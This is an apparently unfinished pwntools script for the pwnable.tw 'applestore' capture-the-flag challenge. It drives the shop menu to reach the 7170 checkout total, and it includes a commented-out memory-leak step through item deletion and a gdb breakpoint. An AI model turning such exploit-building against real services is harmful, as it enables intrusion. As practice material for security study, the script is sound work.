from pwn import *

# === Device List ===
# 1: iPhone 6 - $199
# 2: iPhone 6 Plus - $299
# 3: iPad Air 2 - $499
# 4: iPad Mini 3 - $399
# 5: iPod Touch - $199

# 16*199 + 10*399 = 7170
def _add(index):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'> ', str(index).encode())

def _delete(index):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'> ', str(index).encode())

def _cart():
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'> ', b'y')

def _checkout():
    io.sendlineafter(b'> ', b'5')
    io.sendlineafter(b'> ', b'y')

# io = remote("chall.pwnable.tw", 10104)
io = process("./applestore")


for i in range(16): _add(1)
for i in range(10): _add(4)
_checkout()

# _delete(27)
# io.recvuntil(b'Remove 27:')
# leak = io.recvline().split(b'from your shopping cart')[0]
# info("Leak: " + str(u64(leak[:8])))

attach(io, gdbscript="""
break *delete
""")
       
io.interactive()